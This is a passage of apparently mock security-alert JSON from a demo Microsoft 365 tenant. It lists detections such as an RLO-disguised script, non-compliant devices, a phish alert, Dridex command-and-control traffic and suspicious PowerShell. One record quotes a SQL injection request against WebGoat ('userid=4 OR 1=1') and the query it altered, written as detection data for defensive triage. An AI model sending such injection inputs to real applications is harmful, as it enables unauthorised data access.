                "provider": "Windows Defender ATP",
                "providerVersion": "3.10.2",
                "subProvider": "EDR",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "dt-aldom.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": False,
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "dt-aldom",
                    "os": "null",
                    "privateIpAddress": "10.8.198.18",
                    "publicIpAddress": "172.16.33.115",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "95.142.39.125",
                    "destinationDomain": "null",
                    "destinationPort": "null",
                    "destinationUrl": "null",
                    "direction": "inbound",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "ipv4",
                    "riskScore": "null",
                    "sourceAddress": "172.16.33.115",
                    "sourcePort": "null",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "aldom",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "12BDB39C-C4E5-48B8-AE61-E8E5ADA8D77B",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "analyst@M365x594651.onmicrosoft.com",
            "category": "Social Engineering",
            "closedDateTime": "null",
            "comments": [
                "This is a common technique to fool users into clicking on a file that looks like a JPG"
            ],
            "confidence": "null",
            "createdDateTime": "2020-05-19T09:05:47Z",
            "description": "Attackers can implant the right-to-left-override (RLO) in a filename to change the order of the characters in the filename and make it appear legitimate.  This technique is used in different social engineering attacks to convince the user to run the file, and may also be used for hiding purposes.  The file photoviewgpj.ps1 disguises itself as photoview1sp.jpg",
            "detectionIds": [],
            "eventDateTime": "2020-05-19T09:05:47Z",
            "feedback": "TruePositive",
            "lastModifiedDateTime": "2020-05-17T09:05:47Z",
            "recommendedActions": [
                "1. Run a full scan.  2. Submit the suspicious file and check its results."
            ],
            "severity": "medium",
            "sourceMaterials": [
                "https://securitycenter.windows.com/alerts/3b27f9e7-c6e1-4af4-9bc8-288dddb006a9"
            ],
            "status": "inProgress",
            "title": "Right-to-Left-Override (RLO) technique observed",
            "vendorInformation": {
                "provider": "Windows Defender ATP",
                "providerVersion": "3.10.2",
                "subProvider": "EDR",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "photoview1sp.jpg",
                    "path": "c:\\\\temp\\\\photoview1sp.jpg",
                    "riskScore": "null",
                    "fileHash": {
                        "hashType": "sha256",
                        "hashValue": "091835b16192e526ee1b8a04d0fcef534544cad306672066f2ad6973a4b18b19"
                    }
                }
            ],
            "hostStates": [
                {
                    "fqdn": "lap-douglasf.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": False,
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "lap-douglasf",
                    "os": "null",
                    "privateIpAddress": "10.8.198.18",
                    "publicIpAddress": "172.16.37.122",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "257F2933-A145-4061-9464-2D964A91EB91",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "MANUAL",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-19T08:13:00Z",
            "description": "SQL Injection, Cross-Site Scripting. We observed the following suspicious value enter the application through the HTTP Request Parameter \"userid\":POST /WebGoat/SqlInjection/attack5b HTTP/1.0 userid=4+OR+1%3D1 This value was again observed altering the meaning of the SQL query executed within org.hsqldb.jdbc.JDBCStatement.executeQuery(Unknown Source):SELECT * FROM user_data WHERE userid = 4 OR 1=1.",
            "detectionIds": [
                "3da8c0d0-a2a1-414e-ac41-8edfc3599912",
                "14a83b44-1fa2-44cd-9922-2ec6584c5841",
                "0cc44c01-1387-4cdd-986c-a0856111d03d",
                "fe8835fd-1581-4be8-8221-76c1298b1db3"
            ],
            "eventDateTime": "2020-05-19T08:13:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-19T08:13:00Z",
            "recommendedActions": [],
            "severity": "high",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Active attack EXPLOITED in QA",
            "vendorInformation": {
                "provider": "Contrast Security",
                "providerVersion": "1.0",
                "subProvider": "",
                "vendor": "Contrast Security"
            },
            "cloudAppStates": [
                {
                    "destinationServiceIp": "null",
                    "destinationServiceName": "null",
                    "riskScore": "null"
                },
                {
                    "destinationServiceIp": "null",
                    "destinationServiceName": "null",
                    "riskScore": "null"
                }
            ],
            "fileStates": [
                {
                    "name": "null",
                    "path": "/path/users/3/update",
                    "riskScore": "null",
                    "fileHash": "null"
                }
            ],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "null",
                    "destinationDomain": "null",
                    "destinationPort": "null",
                    "destinationUrl": "null",
                    "direction": "null",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "ip",
                    "riskScore": "null",
                    "sourceAddress": "10.8.168.41",
                    "sourcePort": "null",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "null",
                    "domainName": "null",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "basimk",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "null"
                }
            ],
            "vulnerabilityStates": [
                {
                    "cve": "CVE-2018-XXXXYYYY",
                    "wasRunning": "null",
                    "severity": "High"
                },
                {
                    "cve": "cve-vulnerabilityStates-d6193bfc-1872-476d-b4ca-2a9da7ec8e49-1",
                    "wasRunning": "null",
                    "severity": "High"
                }
            ]
        },
        {
            "id": "08FC8D3A-E854-49F1-9C1A-C34ED9683D69",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "nonCompliantDevice",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-23T22:12:00Z",
            "description": "No compliance policies have been assigned",
            "detectionIds": [],
            "eventDateTime": "2020-05-23T22:12:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-23T22:12:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Managed device x1-alicel.M365x594651.onmicrosoft.com is not compliant",
            "vendorInformation": {
                "provider": "Intune",
                "providerVersion": "1.0.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "x1-alicel.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": True,
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "x1-alicel",
                    "os": "null",
                    "privateIpAddress": "192.168.0.7",
                    "publicIpAddress": "11.20.46.27",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "alicel",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "10.0.11.41",
                    "logonLocation": "null",
                    "logonType": "interactive",
                    "onPremisesSecurityIdentifier": "S-1-5-21-2282740080-523965082-935761018-4275",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "alicel@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "C49793FC-6E62-4BA1-8E48-845A8E3A5005",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "nonCompliantDevice",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-23T03:32:00Z",
            "description": "No compliance policies have been assigned",
            "detectionIds": [],
            "eventDateTime": "2020-05-23T03:32:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-23T03:32:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Managed device dt-aldom.M365x594651.onmicrosoft.com is not compliant",
            "vendorInformation": {
                "provider": "Intune",
                "providerVersion": "1.0.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "dt-basimk.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "dt-basimk",
                    "os": "null",
                    "privateIpAddress": "10.8.2.117",
                    "publicIpAddress": "130.10.98.73",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "basimk",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "interactive",
                    "onPremisesSecurityIdentifier": "S-1-5-21-2290740950-412965992-659761937-1139",
                    "riskScore": "medium",
                    "userAccountType": "standard",
                    "userPrincipalName": "basimk@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "6643A193-62C6-47B5-953B-0DA017A97B75",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "nonCompliantDevice",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-22T20:53:00Z",
            "description": "No compliance policies have been assigned",
            "detectionIds": [],
            "eventDateTime": "2020-05-22T20:53:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-22T20:53:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Managed device lap-christiec.M365x594651.onmicrosoft.com is not compliant",
            "vendorInformation": {
                "provider": "Intune",
                "providerVersion": "1.0.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "lap-christiec.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": True,
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "lap-christiec",
                    "os": "null",
                    "privateIpAddress": "10.8.2.115",
                    "publicIpAddress": "112.40.56.127",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "christiec",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "10.0.1.131",
                    "logonLocation": "null",
                    "logonType": "remoteInteractive",
                    "onPremisesSecurityIdentifier": "S-1-5-21-2290933951-953965113-838761928-7001",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "christiec@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "7FE6D18A-BF3B-463E-8D58-B106270CEDFF",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "Device Not In Compliance",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T20:34:31.3936379Z",
            "description": "Password is not set",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T20:34:28.1020517Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T20:34:31.7407449Z",
            "recommendedActions": [
                "This device requires that a password be set"
            ],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Managed Device Christie’s iPhone is not Compliant",
            "vendorInformation": {
                "provider": "Intune",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "CHRISTIE’S IPHONE",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "Christie’s iPhone",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "christiec",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "christiec@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "4FDED286-CC88-4AD0-9F78-01F128A74908",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "Device Not In Compliance",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T20:30:41.4651956Z",
            "description": "Device must be encrypted",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T20:30:34.0089338Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T20:30:41.4862512Z",
            "recommendedActions": [
                "This device must have file encryption enabled.\nYou may also need to set a startup password for encryption to be compliant."
            ],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Managed Device pattif_Android is not Compliant",
            "vendorInformation": {
                "provider": "Intune",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "pattif_Android",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "pattif",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "pattif@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "23E63C17-4EAF-4FAA-A849-EF22EEFCF8B0",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "Device Not In Compliance",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T20:20:55.9842458Z",
            "description": "Device must be encrypted",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T20:20:48.3364006Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T20:20:56.3916327Z",
            "recommendedActions": [
                "This device must have file encryption enabled.\nYou may also need to set a startup password for encryption to be compliant."
            ],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Managed Device basimk_Android is not Compliant",
            "vendorInformation": {
                "provider": "Intune",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "basimk_Android",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "basimk",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "basimk@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "7771712A-9AED-4EF6-A676-2F19536C85C4",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "Device Not In Compliance",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T20:06:10.2783071Z",
            "description": "Password is not set",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T20:05:58.5552904Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T20:06:10.8896579Z",
            "recommendedActions": [
                "This device requires that a password be set"
            ],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Managed Device Aldo’s iPhone is not Compliant",
            "vendorInformation": {
                "provider": "Intune",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "ALDO’S IPHONE",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "Aldo’s iPhone",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "aldom",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "071C9BD5-488F-4C8B-9197-C99FE6C53DAB",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "analyst@contoso.com",
            "category": "nonCompliantDevice",
            "closedDateTime": "null",
            "comments": [
                "jailbroken"
            ],
            "confidence": "null",
            "createdDateTime": "2020-05-17T03:32:00Z",
            "description": "No compliance policies have been assigned",
            "detectionIds": [],
            "eventDateTime": "2020-05-17T03:32:00Z",
            "feedback": "TruePositive",
            "lastModifiedDateTime": "2020-05-17T03:32:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "inProgress",
            "title": "Managed device lap-pattif.M365x594651.onmicrosoft.com is not compliant",
            "vendorInformation": {
                "provider": "Intune",
                "providerVersion": "1.0.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "lap-pattif.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": True,
                    "netBiosName": "lap-pattif",
                    "os": "null",
                    "privateIpAddress": "10.0.0.15",
                    "publicIpAddress": "13.82.64.11",
                    "riskScore": "4"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "pattif",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "interactive",
                    "onPremisesSecurityIdentifier": "S-1-5-21-2290740950-412965992-659761928-1139",
                    "riskScore": "medium",
                    "userAccountType": "standard",
                    "userPrincipalName": "pattif@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "787B2040-B861-4E67-8824-C8CDDDCB8008",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "analyst@M365x594651.onmicrosoft.com",
            "category": "ThreatManagement",
            "closedDateTime": "null",
            "comments": [
                "New alert",
                "Starting investigation",
                "Assigning to myself",
                "malicious",
                ""
            ],
            "confidence": "null",
            "createdDateTime": "2020-05-19T08:42:52Z",
            "description": "An email containing a malicious URL or attachment was blocked and cleaned from your mailbox",
            "detectionIds": [],
            "eventDateTime": "2020-05-19T08:42:52Z",
            "feedback": "unknown",
            "lastModifiedDateTime": "2020-05-19T08:42:52Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "inProgress",
            "title": "Phish alert",
            "vendorInformation": {
                "provider": "Office 365 Security and Compliance",
                "providerVersion": "",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [
                {
                    "category": "",
                    "family": "Phish",
                    "name": "",
                    "severity": "",
                    "wasRunning": "null"
                }
            ],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "0F73E38F-BA78-49F7-A71C-0A37D329E808",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "analyst@M365x594651.onmicrosoft.com",
            "category": "Malicious_IP",
            "closedDateTime": "null",
            "comments": [
                "Investigating",
                "test",
                "IP Address has reputation as spamming and source of malware"
            ],
            "confidence": 0,
            "createdDateTime": "2020-05-23T14:36:57.2738949Z",
            "description": "Network traffic analysis indicates that your devices communicated with what might be a Command and Control center for a malware of type Dridex. Dridex is a banking trojan family that steals credentials of online banking websites. Dridex is typically distributed via phishing emails with Microsoft Word and Excel document attachments. These Office documents contain malicious macro code that downloads and installs Dridex on the affected system.",
            "detectionIds": [],
            "eventDateTime": "2020-05-23T11:02:01Z",
            "feedback": "TruePositive",
            "lastModifiedDateTime": "2020-05-23T14:37:05.1157187Z",
            "recommendedActions": [
                "1. Escalate the alert to your security administrator.",
                "2. Add the source IP address to your local FW block list for 24 hours. For more information, see Plan virtual networks (https://azure.microsoft.com/en-us/documentation/articles/virtual-networks-nsg/).",
                "3. Make sure your devices are completely updated and have updated antimalware installed.",
                "4. Run a full anti-virus scan and verify that the threat was removed.",
                "5. Install and run Microsoftâ€™s Malicious Software Removal Tool (https://www.microsoft.com/en-us/security/pc-security/malware-removal.aspx).",
                "6. Run Microsoftâ€™s Autoruns utility and try to identify unknown applications that are configured to run when you sign in. For more information, see Autoruns for Windows (https://technet.microsoft.com/en-us/sysinternals/bb963902.aspx).",
                "7. Run Process Explorer and try to identify any unknown processes that are running. For more information, see Process Explorer (https://technet.microsoft.com/en-us/sysinternals/bb896653.aspx)."
            ],
            "severity": "high",
            "sourceMaterials": [],
            "status": "inProgress",
            "title": "Network communication with a malicious IP",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "lap-pattif.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "lap-pattif",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [
                {
                    "category": "Trojan",
                    "family": "Dridex",
                    "name": "",
                    "severity": "",
                    "wasRunning": True
                }
            ],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "162.125.3.6",
                    "destinationDomain": "www.contos0.com",
                    "destinationPort": "null",
                    "destinationUrl": "null",
                    "direction": "inbound",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "ipv4",
                    "riskScore": "null",
                    "sourceAddress": "null",
                    "sourcePort": "null",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "pattif",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "pattif@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "D16B2923-2134-4F94-9FF1-B40761EA3E1D",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "analyst@M365x594651.onmicrosoft.com",
            "category": "suspiciousPowerShell",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-19T09:06:55Z",
            "description": "Analysis of host data detected a powershell script running on LAP-DOUGLASF that has features in common with known suspicious scripts. This script could either be legitimate activity, or an indication of a compromised host.",
            "detectionIds": [],
            "eventDateTime": "2020-05-19T09:06:09Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-19T12:14:09Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [
                "https://ms.portal.azure.com/#blade/Microsoft_Azure_Security/SecurityMenuBlade/6"
            ],
            "status": "inProgress",
            "title": "Suspicious Powershell Activity Detected",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.1.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "lap-douglasf.M365x594651.onmicrosoft.com",
